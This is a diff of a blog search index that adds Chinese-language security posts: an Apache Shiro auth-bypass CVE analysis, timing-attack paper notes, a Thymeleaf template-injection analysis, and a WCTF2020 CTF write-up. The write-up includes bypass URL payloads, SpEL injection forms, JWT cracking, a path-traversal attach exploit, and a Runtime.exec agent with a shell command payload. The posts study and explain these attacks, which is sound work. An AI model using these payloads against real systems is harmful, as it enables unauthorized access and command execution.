@@ -470,7 +470,7 @@
       </tags>
   </entry>
   <entry>
-    <title>2020-DDCTF web方向 WriteUp</title>
+    <title>DDCTF2020 web方向 WriteUp</title>
     <url>/2020/09/08/ddctf/</url>
     <content><![CDATA[<p>上周参与了下2020 DDCTF比赛，做了web方向的题，加一个MISC的拼图，最终排名15。在这里将web方向题的writeup记录下来。</p>
 <a id="more"></a>
@@ -3283,6 +3283,238 @@ select &quot;&lt;?php eval($_GET[&apos;post&apos;]);?&gt;;&quot;</code></pre><h1
       </categories>
       <tags>
         <tag>RMI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Shiro权限绕过漏洞</title>
+    <url>/2020/09/24/shiro-11989/</url>
+    <content><![CDATA[<p>今年出现了三个shiro权限绕过漏洞，后来出现的两个漏洞与之前分析过的CVE-2020-1957这个漏洞原理一样，都是在spring框架下，由于shiro处理uri与spring处理uri不一致导致的。这篇文章介绍了与之相关，目前已经出现的4个漏洞。</p>
+<a id="more"></a>
+
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>在spring框架使用shiro进行鉴权时，由于处理uri的逻辑不一致，导致权限绕过。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul>
+<li>shiro-682      shiro &lt; 1.5.0</li>
+<li>CVE-2020-1957  shiro &lt;= 1.5.1</li>
+<li>CVE-2020-11989  shiro &lt; 1.5.3</li>
+<li>CVE-2020-13922  shiro &lt; 1.6.0</li>
+</ul>
+<blockquote>
+<p>在shiro 1.6.0以下版本中存在可以绕过鉴权的可能。</p>
+</blockquote>
+<h1 id="分析复现"><a href="#分析复现" class="headerlink" title="分析复现"></a>分析复现</h1><p>复现环境参考:<a href="https://github.com/l3yx/springboot-shiro" target="_blank" rel="noopener">https://github.com/l3yx/springboot-shiro</a></p>
+<p>在shiroConfig中设置的ant风格URL匹配为<code>/*</code>而不是<code>/**</code>:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">   <span class="function">ShiroFilterFactoryBean <span class="title">shiroFilterFactoryBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       ShiroFilterFactoryBean bean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">       bean.setSecurityManager(securityManager());</span><br><span class="line">       bean.setLoginUrl(<span class="string">"/login"</span>);</span><br><span class="line">       bean.setSuccessUrl(<span class="string">"/index"</span>);</span><br><span class="line">       bean.setUnauthorizedUrl(<span class="string">"/unauthorizedurl"</span>);</span><br><span class="line">       Map&lt;String,String&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">"/doLogin"</span>,<span class="string">"anon"</span>);</span><br><span class="line">       map.put(<span class="string">"/admin/*"</span>,<span class="string">"authc"</span>);</span><br><span class="line">       bean.setFilterChainDefinitionMap(map);</span><br><span class="line">       <span class="keyword">return</span> bean;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="shiro-682"><a href="#shiro-682" class="headerlink" title="shiro-682"></a>shiro-682</h2><p>前面有对shiro-682进行过详细分析，由于shiro对于URL路径表达式只能正确匹配到<code>/resource/menus</code>，而无法匹配到<code>/resource/menus/</code>，同时对于spring来说，<code>/resource/menus</code>和<code>/resource/menus/</code>是一样的，导致了权限绕过。传送门<a href="https://ananaskr.github.io/2020/05/24/shiro-682/" target="_blank" rel="noopener">CVE-2020-1957 Shiro权限绕过漏洞分析</a>。</p>
+<p>payload形式为<code>/index/admin/</code></p>
+<p><strong>修复方式:</strong><br>在1.5.0版本中，在获取到URL后，将最后一个<code>/</code>去掉再进行URL匹配。<br><img src="1.png" alt=""></p>
+<h2 id="CVE-2020-2957"><a href="#CVE-2020-2957" class="headerlink" title="CVE-2020-2957"></a>CVE-2020-2957</h2><p>在shiro-682进行了修复之后，依然是在shiro处理URL的地方，shiro会判断URI中是否有<code>;</code>，若有，则截取<code>;</code>之前的值作为URL；但是spring中却是截取<code>;</code>之后的URI，从而绕过了鉴权。传送门<a href="https://ananaskr.github.io/2020/05/24/shiro-682/" target="_blank" rel="noopener">CVE-2020-1957 Shiro权限绕过漏洞分析</a>。</p>
+<p>payload的形式为<code>/xxx;/index/admin</code></p>
+<p><strong>修复方式</strong><br>在1.5.2版本中，将request.getRequestUri直接获取URI的方式更改为获取request.ContextPath，request.ServletPath，request.PathInfo，再将这三者进行拼接。看看这三者的区别:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getContextPath()      &#x2F;&#x2F;获取该项目的根路径</span><br><span class="line">getServletPath()      &#x2F;&#x2F;获取与url-pattern中匹配的路径，如&#x2F;hello&#x2F;* &#x3D;&gt; &#x2F;hello</span><br><span class="line">getPathInfo()         &#x2F;&#x2F;获取url-pattern中*匹配的地方</span><br><span class="line"></span><br><span class="line">getRequestURI()       &#x2F;&#x2F;获取根路径到地址结尾</span><br><span class="line">getRequestURL()       &#x2F;&#x2F;获取请求的地址链接</span><br></pre></td></tr></table></figure>
+
+
+<p>ServletPath获取到的是<code>;</code>以后的URI，针对于<code>/xxx;/index/admin</code>的情况，获取到的uri值为<code>//index/admin</code>，因此无法使用<code>;</code>进行绕过。<br><img src="2.png" alt=""></p>
+<h2 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h2><p>前面对CVE-2020-2957进行了漏洞修复之后，还是存在绕过的方式。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境中实现的效果是当访问<code>/admin/page</code>下的路径时，若未登录，则会跳转到登录页面。如下所示<br><img src="3.png" alt=""><br>当采用如下的路径时<code>/;/admin/page</code>，会绕过认证。<br><img src="4.png" alt=""></p>
+<blockquote>
+<p>别人提出了采用url双编码的方式也能绕过，双重编码的url在进入应用程序时，会进行解码一次，但是在我实验时并未进行一次解码。</p>
+</blockquote>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看一下Shiro对于URL的获取以及处理。定位在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>。<br><img src="5.png" alt=""></p>
+<p>跟进getPathWithinApplication()方法。<br><img src="6.png" alt=""></p>
+<p>继续跟进WebUtils.getPathWithinApplication()方法。<br><img src="7.png" alt=""></p>
+<p>首先获取当前contextPath，由于在根目录下，这里为空。然后调用getRequestUri()方法获取requestUri。跟进getRequestUri()。<br><img src="8.png" alt=""></p>
+<p>首先调用了request.getAttribute(“javax.servlet.include.request_uri”)，这里返回的结果为null，进入request.getRequestURI()。<br><img src="9.png" alt=""></p>
+<p>request.getRequestURI()获取到的还是正常的输入的path，那么问题就是出现在了normalize(decodeAndCleanUriString(request, uri))上。跟进decodeAndCleanUriString()方法。<br><img src="10.png" alt=""></p>
+<p>在这里，当出现<code>;</code>时，只取<code>;</code>前面部分作为uri进行认证鉴权。</p>
+<p>鉴权完成之后，该request请求就会进入spring中，spring处理url函数定位在    <font color=#008000>org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping</font>。<br><img src="11.png" alt=""></p>
+<p>跟进getRequestUri()方法。<br><img src="12.png" alt=""></p>
+<p>继续进入decodeAndCleanUriString()方法。<br><img src="13.png" alt=""></p>
+<p>看这里的函数名，第一个是removeSemicolonContent()，作用是移除<code>;</code>。跟进<br><img src="14.png" alt=""></p>
+<p>这里移除了;。整个路径变成了//admin/page。接着跟进getSanitizedPath()方法。<br><img src="155.png" alt=""><br>这里正好将//变为一个/。最后的路径为/admin/page。正好能够访问到资源。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在1.5.3版本中，getPathWithinApplication()中获取uri改为了由ServletPath + PathInfo，去掉了Context，且不再进行url解码。<br><img src="16.png" alt=""></p>
+<h2 id="CVE-2020-13922"><a href="#CVE-2020-13922" class="headerlink" title="CVE-2020-13922"></a>CVE-2020-13922</h2><p>前面对漏洞进行了修复。但是仍然出现问题，</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>该漏洞需要配置的controller如下所示:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/admin/&#123;name&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@PathVariable String name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello admin"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即/admin/后面无论跟什么字符串，都是可访问到admin页面的。<br>这次的绕过就是将<code>;</code>进行编码后，就能绕过权限。<br><img src="17.png" alt=""></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>前面的payload为/admin/%3bpage，首先来看看它是如何绕过shiro，再来看看spring是如何将其处理为/admin/xxx的。<br>定位于org.apache.shiro.web.util.WebUtil#getPathWithinApplication()。<br><img src="18.png" alt=""></p>
+<p>首先通过getServletPath获得了解码后的/admin/;page。然后跟进removeSemicolon()方法。<br><img src="19.png" alt=""></p>
+<p>经过去除分号的处理后，变为/admin/回到org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()。<br><img src="20.png" alt=""><br>在这里首先会将最后一个/去掉，然后匹配模式，由于未匹配到/admin/*，因此绕过了shiro的认证鉴权。</p>
+<p>再来看看spring的处理，定位于org.springframework.web.util.UrlPathHelper#getRequestUri()。<br><img src="21.png" alt=""><br>它获取到的是未解码的uri，然后进入decodeAndCleanUriString()中。<br><img src="22.png" alt=""><br>在这里面的一个过程是，先移除分号，再进行uri解码操作。因此分号被保留了下来，最后返回的是/admin/;page，因此能够访问到hello admin页面。</p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 org.apache.shiro.web.filter添加了一个InvalidRequestFilter类，该类从全局上对 ; \ 以及非ASCII字符进行过滤。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">Apache Shiro 身份验证绕过漏洞(CVE-2020-11989)</a></li>
+<li><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">Apache Shiro 权限绕过漏洞分析(CVE-2020-11989)</a></li>
+<li><a href="https://xz.aliyun.com/t/8230" target="_blank" rel="noopener">Apache shiro安全漏洞(CVE-2020-13933)分析</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shiro-13922</title>
+    <url>/2020/09/24/shiro-13922/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>timeless-timing-attack</title>
+    <url>/2020/11/25/timeless-timing-attack/</url>
+    <content><![CDATA[<p>《无需时间的定时攻击:在远程连接上利用并发泄漏secret》</p>
+<p>为了实施一个成功的远程定时攻击，攻击者往往会收集一系列网络计时度量，接着利用静态分析在执行时间内显示差异。需获得的度量数量很大程度上受到请求和响应的抖动量。在远程定时攻击中，重要的抖动量是攻击者与目标服务器之前的网络路径，实际上，在只有很小的差异的情况下，很难成功利用时间侧信道。<br>而在这篇文章中，作者概念性地介绍了一种新类型的定时攻击，利用了网络协议对于数据包的合并和应用程序并发处理请求的特性。这些基于并发的定时攻击通过分析响应返回的顺序推理出相对的时间差异，因此并不依赖于任何绝对时间信息。</p>
+<p>在这篇文章中，作者展示了这些攻击如何导致比经典定时攻击放大100倍的效果，即可 准确地检测100ns的时间差异，就像是在本地的攻击一样。描述了这些定时攻击如何成功利用在基于HTTP/2的web服务器上，洋葱匿名服务以及EAP-pwd(一个流行的WIFI认证方法)。</p>
+<p>当一个应用程序/算法的执行时间依赖于一个secret，那么就有可能通过定时攻击来泄漏出secret。</p>
+<p>复用网络协议+App并发执行，完全不受网络条件的影响。新的攻击方式从顺序中提取出信息，当两个并发任务执行结束后。</p>
+<p>为了攻击能够成功执行，所有的task执行开始之间的间歇必须很短，一个接一个，这个时间间隙相对于网络是无影响的。可以采用利用一些技术来使得多种网络协议，将不同的请求放在一个网络包中。因此，所有的请求将会同时达到目标服务器，并被并发处理。</p>
+<p>贡献:</p>
+<ul>
+<li>介绍了定时攻击的模型，并在理论上证明，基于并发的攻击不受网络影响。</li>
+<li>HTTP/2中的请求和响应复用可以被用来实施基于并发的定时攻击，无论是直接威胁/跨站威胁。</li>
+</ul>
+<h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>HTTP2.0的一个特性是多路复用的单一长连接。<br>在HTTP/2.0中，客户端向某个域名的服务器请求的过程中，只会创建一条TCP连接。<br>虽然只有一条TCP连接，但是在逻辑上分成了很多stream。HTTP/2.0把要传输的信息分割成一个个的二进制帧，首部信息被封装到HEADER Frame，相应的request body就放到DATA Frame，</p>
+]]></content>
+      <categories>
+        <category>论文笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>wctf2020-thymeleaf</title>
+    <url>/2021/02/24/wctf2020-thymeleaf/</url>
+    <content><![CDATA[<p>文章首发于<a href="https://xz.aliyun.com/t/8568" target="_blank" rel="noopener">先知</a>: 前段时间参加了WCTF2020比赛，当时主要是通过盲测的方式找到了正确的payload，但是对于网上出现的多种payload形式并不了解其原因，因此有了这篇文章。</p>
+<a id="more"></a>
+
+<p>根据网上出现的payload以及比赛中用到的payload，一共有以下3种。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__$&#123;xxx&#125;__::.x</span><br><span class="line">__$&#123;xxx&#125;__::</span><br><span class="line">__$&#123;xxx&#125;__::x.</span><br></pre></td></tr></table></figure>
+
+<p>Thymeleaf这道题采用的环境是Spring+Thymeleaf，当web应用基于spring，Thymeleaf使用SpEL，否则使用OGNL。</p>
+<h2 id="前置知识-预处理"><a href="#前置知识-预处理" class="headerlink" title="前置知识: 预处理"></a>前置知识: 预处理</h2><p>Thymeleaf模版引擎有一个特性叫做表达式预处理(Expression PreProcessing)，置于<code>__...__</code>之中会被预处理，预处理的结果再作为表达式的一部分继续处理。举例如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;selection.__$&#123;sel.code&#125;__&#125;</span><br><span class="line">#&#123;selection.val&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解析过程分析"><a href="#解析过程分析" class="headerlink" title="解析过程分析"></a>解析过程分析</h2><h3 id="01-获取view"><a href="#01-获取view" class="headerlink" title="01. 获取view"></a>01. 获取view</h3><p>当访问一个api时，spring与Thymeleaf是如何配合的呢？首先定位到<code>org.springframework.web.servlet.DispatcherServlet#doDispatch()</code>，这是都会经过的一个点。<br><img src="1.png" alt=""><br>在该函数中获取ModelAndView对象，看图中的两行代码，会经过2个过程。</p>
+<ol>
+<li>ha.handle()</li>
+<li>applyDefaultViewName()</li>
+</ol>
+<p>首先来看第一个过程，跟进handle()方法，直接跟进到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#handleInternal()</code><br><img src="2.png" alt=""><br>这里可以看到mav的获取方法，跟进invokeHandlerMethod()，直接跟进到invokeAndHandle()。<br><img src="3.png" alt=""><br>这里的<code>returnValue</code>是否有值，决定了2种类型的payload。returnValue的获取会invoke此Request对应的函数获取返回值，例如下面这个例子访问<code>/path</code>时，获取return的值为<code>user/{lang}/welcome</code>作为ModelAndView的view值。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;path&quot;)</span><br><span class="line">public String path(@RequestParam String lang) &#123;</span><br><span class="line">        return &quot;user&#x2F;&quot; + lang + &quot;&#x2F;welcome&quot;; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但如果例子是下面这样的呢？此时ModelAndView的view值为null。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@DeleteMapping(value &#x3D; &quot;&#x2F;&#123;username&#125;&quot;)</span><br><span class="line">public void deleteUser(@PathVariable(name &#x3D; &quot;username&quot;) String username) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着往下来到第二个过程，跟进applyDefaultViewName()。<br><img src="4.png" alt=""><br>在这里，若ModelAndView对象中的view不为空，则啥也不做，否则会获取DefaultView作为View。来看看defaultview是如何获取的。跟进getDefaultViewName()，继续跟进viewNameTranslator.getViewName()。<br><img src="5.png" alt=""><br>在该方法中首先获取uri的path值，然后进入transformPath()方法，最后和prefix以及suffix进行拼接，即为ViewName。跟进transformPath()。<br><img src="6.png" alt=""><br>在这里会去掉前后的<code>/</code>，它会将<code>.</code>及之后的内容当作扩展名，会截掉<code>.</code>以及之后的内容。因此，这种情况下需要在payload后增加一个<code>.</code>以保证payload内容完整。</p>
+<h3 id="02-解析表达式"><a href="#02-解析表达式" class="headerlink" title="02. 解析表达式"></a>02. 解析表达式</h3><p><img src="7.png" alt=""><br>获取到view后，接着往下跟进processDispatchResult()。<br><img src="8.png" alt=""><br>继续跟进render()。<br><img src="9.png" alt=""><br>首先获取viewName，然后调用resolveViewName()，选择bestView，这里的往往会返回ThymeleafView，保持了和view一样的值。然后接着往下，调用了view.render()，即ThymeleafView.render()。跟进。<br><img src="10.png" alt=""><br>继续跟进renderFragment()。<br><img src="11.png" alt=""><br>在这里会判断viewTemplateName是否包含<code>::</code>，然后调用IStandardExpressionParser.parseExpression()解析<code>~{viewTemplateName}</code>表达式。<br><img src="12.png" alt=""><br>继续调用parseExpression()。<br><img src="13.png" alt=""><br>这里首先调用preprocess对<code>__${}__</code>里的内容进行预处理，结果存入 preprocessedInput，然后调用Expression.parse()进行第二次解析表达式。<br>在第一次处理时，只要<code>__${}__</code>里面的语法正确，是一定会被执行的。执行完的第二次表达式解析是否正确就不一定了。如果第二次执行失败，则会显示原来的viewTemplateName值，而没有回显，但事实上已经执行了恶意语句。影响第二次执行失败与否与<code>~{}</code>里的语法格式有关。<br><img src="15.png" alt=""><br>当<code>~{}</code>中出现::，其后面需要有值。</p>
+<h2 id="场景分析"><a href="#场景分析" class="headerlink" title="场景分析"></a>场景分析</h2><h3 id="01-场景一"><a href="#01-场景一" class="headerlink" title="01. 场景一"></a>01. 场景一</h3><p><code>__${}__::</code> 在使用<a href="https://github.com/veracode-research/spring-view-manipulation/" target="_blank" rel="noopener">veracode-research</a>的环境时，这种类型的payload确实能够成功。这和它一开始获取到的view有着很大的关系。<br><img src="14.png" alt=""><br>像上图的这种，拼接后的结果为<code>~{user/__${}__::/welcome}</code>，第一次解析后的结果为<code>~{user/xxx::/welcome}</code>这样的完全是合法的语法。</p>
+<p><code>__${}__::.x</code> 是<a href="https://github.com/veracode-research/spring-view-manipulation/" target="_blank" rel="noopener">veracode-research</a>在示例中展现的payload，能成功，但是不需要.x也能成功。</p>
+<h3 id="02-场景二"><a href="#02-场景二" class="headerlink" title="02. 场景二"></a>02. 场景二</h3><p><code>__${}__::x.</code> 是在wctf中用到的payload，由于是void类型，在获取view时，是使用了path值，并截掉了<code>.</code>及之后的内容。因此需要在::后面有值且在最后有一个<code>.</code>。<br><img src="16.png" alt=""></p>
+<h3 id="03-场景三"><a href="#03-场景三" class="headerlink" title="03. 场景三"></a>03. 场景三</h3><p><img src="17.png" alt=""><br>显而易见，这种情况下不需要::，但是结尾需要.。</p>
+<h3 id="04-场景四"><a href="#04-场景四" class="headerlink" title="04. 场景四"></a>04. 场景四</h3><p><img src="18.png" alt=""><br>这种情况下，不能成功。因为它设置了@ResponseBody，在这种情况下，sring会将return的值作为响应内容，而不是模版。</p>
+<h3 id="05-更多场景"><a href="#05-更多场景" class="headerlink" title="05. 更多场景"></a>05. 更多场景</h3><p>还有多种场景可自行分析……</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>综上，在一个spring+thymeleaf的应用中，进行模版注入需要分析当前的场景，然后才能判断是否有漏洞，在做检测时比较难。比较通用的payload形式为<code>__${}__::x.</code>，有回显。在无回显的情况下，只要保证<code>__${}__</code>里的语法正确，以及整个viewTemplateName中包含::即可，无论::的位置在哪儿都行。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://github.com/veracode-research/spring-view-manipulation/" target="_blank" rel="noopener">veracode-research</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+      <tags>
+        <tag>Thymeleaf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WCTF2020 WriteUp及分析</title>
+    <url>/2020/12/03/wctf2020/</url>
+    <content><![CDATA[<p>对参加的比赛进行复盘是一件很快乐的事情，有些高质量的比赛会学到很多新的知识。这次的WCTF2020中遇到的3道题目都能学到不少，在这里记录下writeup。</p>
+<a id="more"></a>
+
+<h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><p>thymeleaf这道题从名字上来看就是一道模版注入题。题目首先需要扫描路径，经过扫描，发现登录接口<code>/login</code>。<br><img src="thy-1.png" alt=""><br>抓包之后发现seesion为jwt加密，然后使用c-jwt-crack工具爆破secret，爆破出来的secret为admin。然后伪造session，成功登入。接下来需要寻找注入点。<br><img src="thy-2.png" alt=""><br>由于扫描出来了<code>/swagger-ui.html</code>，一个swagger文档，就直接拿到了接口信息，进行下面的操作。<br><img src="thy-3.png" alt=""><br>正常情况下，<code>/auth/user/&lt;username&gt;</code>返回的是一个JSON响应。<br><img src="thy-4.png" alt=""><br>使用DELETE方法后，得到的是不一样的响应结果。<br><img src="thy-5.png" alt=""><br>提示找不到模版，说明将<code>/auth/user/admin</code>作为模版，寻找对应的.html文件。当path中存在双引号或者单引号时，会出现如下信息，需要绕过引号，方法很多。<br><img src="thy-6.png" alt=""><br>这里是将整个path作为viewname了，由于可控的只有部分内容，使用<code>__...__</code>包裹能够使得<code>__...__</code>里面的内容进行预处理，对应的需要使用的payload形式为<code>__${}__::x.</code>，这里payload形式为什么是这样，可参考另一篇<a href="">文章</a>，这里就不解释了。绕过引号的方式很多。</p>
+<ul>
+<li>true.toString().charAt(0).toChars()[0].toString()</li>
+<li>T(Character).toString(104)</li>
+<li>T(String).valueOf(new char[]{xx,xx,xx,xx,x})</li>
+</ul>
+<p>选择的是执行命令的方式，环境在window下，最终选用<code>cmd.exe -c more flag</code>。Java中用type命令并不能读到flag。<br>最终的结果为<br><img src="thy-7.png" alt=""></p>
+<h2 id="SSHLYUXA"><a href="#SSHLYUXA" class="headerlink" title="SSHLYUXA"></a>SSHLYUXA</h2><p>这是一道很有意思的Java Pwn题，攻击思路以及后续的利用都值得学习。<br>题目描述<br>题目通过ssh方式成功登录，然后可以选择创建一个App或者销毁一个App。在这个App中，用户可以做以下三个操作：</p>
+<ul>
+<li><strong>Register username</strong>。 应用程序会请求public key并将其存储在当前目录的keys/目录中，文件名为username.pub。</li>
+<li><strong>Auth username</strong>。 应用程序会产生一个值并要求用户用key进行加密以验证其身份。验证成功则会监听一个unix socket，等待即将到来的message。socket文件在当前目录的socket/目录中，文件名为username。</li>
+<li><strong>msgto username</strong>。 应用程序会显示接收方的public key，读取加密的message并发送至相应的unix socket。</li>
+</ul>
+<p>这道题目给出了源码，从源码中可以看出，无论是在生成public key或者unix socket文件时，都存在目录遍历漏洞，可将文件写在任意位置。<br><img src="ssh-1.png" alt=""><br><img src="ssh-2.png" alt=""><br><img src="ssh-3.png" alt=""></p>
+<p>通过目录遍历漏洞，可以将socket文件、pub文件写入任意位置，也能读取任意位置的pub文件。<br>结合Java Attach机制就可以做这道题了。利用Java Attach机制attach上目标JVM，上传恶意的agent文件，然后发送动态加载agent的指令即可，将命令执行结果保存在一个pub文件中，然后读取pub文件内容。</p>
+<p>整个题目的思路很清晰了，分为以下两步。</p>
+<ul>
+<li>attach上目标JVM</li>
+<li>动态加载agent</li>
+</ul>
+<h3 id="attach目标JVM"><a href="#attach目标JVM" class="headerlink" title="attach目标JVM"></a>attach目标JVM</h3><p>根据上面对于Java Attach机制的分析，我们首先需要获得目标JVM的pid，然后启动目标JVM的Attach Listener线程。</p>
+<p>目标JVM的pid可通过main线程的nid进行预测。通过向目标JVM发送<code>SIGQUIT</code>信号，即可打印出这些信息。<br><img src="ssh-4.png" alt=""><br>在ubuntu20.04下pid为nid-1的十进制，这里为46439。<br>获取到目标JVM的pid后，就可以创建<code>.attach_pid46439</code>文件，利用前面的目标遍历漏洞，在register并auth后，可以创建任意位置的<code>.attach_pid46439</code>文件。此时执行的命令为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">register ..&#x2F;.attach_pid46439</span><br><span class="line">auth ..&#x2F;.attach_pid46439</span><br></pre></td></tr></table></figure>
+<p><img src="ssh-5.png" alt=""><br>这样，就成功创建了<code>.attach_pid46439</code>文件，然后再次发送<code>SIGQUIT</code>信号。此时可以发现<code>/tmp/.java_pid46439</code>成功创建，说明已经成功attach上目标JVM。</p>
+<h3 id="动态加载agent"><a href="#动态加载agent" class="headerlink" title="动态加载agent"></a>动态加载agent</h3><p>agent的内容是攻击者上传的一个恶意Jar包。由于任意写入到.pub文件限制了512字节的大小，因此需要整个Jar包的内容非常简洁。自然地，一个精简的内容如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;A.java</span><br><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">public class A&#123;</span><br><span class="line">    public static void agentmain(String string, Instrumentation instrumentation) throws Exception&#123;</span><br><span class="line">        java.lang.Runtime.getRuntime().exec(string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;META-INF&#x2F;MANIFEST.MF</span><br><span class="line">Agent-Class: A</span><br></pre></td></tr></table></figure>
+<p>采用Jar命令压缩时仍然超出了512字节的大小，由于Jar也是标准的zip压缩格式，可以采用具有更高压缩比的7z压缩方式，压缩命令为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z a -tzip -mx&#x3D;9 agent.jar META-INF&#x2F;MANIFEST.MF A.class</span><br></pre></td></tr></table></figure>
+<p>压缩完，确实比之前减少了很所，但仍然超过了512字节，查看A.class，java自动地加上了默认构造函数。<br><img src="ssh-6.png" alt=""><br>可利用处理器编写Processor来移除它。执行的命令为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -g:none -processor MyProcessor A.java</span><br></pre></td></tr></table></figure>
+<p>即便这样之后，还未达到512字节，使用字节码编辑器去掉异常相关代码，并移除pop操作，这样最终准备好了512字节的Jar包。将其写入到/tmp/pld.pub文件中，执行注册命令，然后输入十六进制编码的Jar包内容。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">register ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;pld</span><br><span class="line">&gt;&gt;&gt; 输入Jar包内容</span><br></pre></td></tr></table></figure>
+<p><img src="ssh-7.png" alt=""></p>
+<p>然后向目标JVM发送动态加载Jar包的命令，由于向<code>/tmp/.java_pid46439</code>发送命令，需要使用msgto <username>。因此需要注册一个<code>../../../../../tmp/.java_pid46439</code>用户。<br><img src="ssh-8.png" alt=""></p>
+<p>在注册完后，即可向其发送消息，消息内容为十六进制编码的命令。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1\x00load\x00instrument\x00false\x00&#x2F;tmp&#x2F;pld.pub&#x3D;sh -c $@|sh . echo &#x2F;readflag &#x2F;FLAG&gt;&#x2F;tmp&#x2F;flag.pub\x00</span><br></pre></td></tr></table></figure>
+<p><img src="ssh-9.png" alt=""><br>发送完之后，这条指令就会被执行，因此flag内容被存入了/tmp/flag.pub中，此时只需要向../../../../../tmp/flag发送消息，就会将/tmp/flag.pub内容十六进制编码后显示出来。最后获取到了flag。<br><img src="ssh-10.png" alt=""></p>
+<h2 id="Spaceless-Spacing"><a href="#Spaceless-Spacing" class="headerlink" title="Spaceless Spacing"></a>Spaceless Spacing</h2><p>题目给了一句话<code>&quot;connect to 3.137.154.50:4242&quot;</code>，这就是全部了。首先nc连上，看看有什么结果。<br><img src="spa-1.png" alt=""><br>Google一下第一行+HTTP，得知为HTTP/2.0协议。curl提供了–http2-prior-knowledge参数来使用HTTP/2.0协议。<br>curl命令加上<code>--http2-prior-knowlwdge</code>参数，可以发送http/2.0协议的请求。  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --http2-prior-knowledge localhost:4242&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="spa-2.png" alt=""><br>就这样获得了应用的源码。尝试了/<secret>这个API，确实存在。<br><img src="spa-3.png" alt=""><br>分析程序逻辑，首先可以爆破secret的位数，接下来爆破每一位的具体值看起来应该使用时间侧信道。即比较时若匹配失败直接返回，匹配成功则会sleep一个很小的时间，进行下一次的匹配直接匹配失败返回。因此某一位匹配成功时，返回的响应会晚一些。如果是采用测量时间差的方式，会受到很大的网络扰动，这根本不可能成功。但是在HTTP/2.0协议下，可以不用测量时间差就可以获得返回响应的顺序。这道题目的作者参考了USENIX2020的一篇论文”Timeless Timing Attacks: Exploiting Concurrency to Leak Secrets over Remote Connection”。这篇论文中介绍了这样的利用方式。</p>
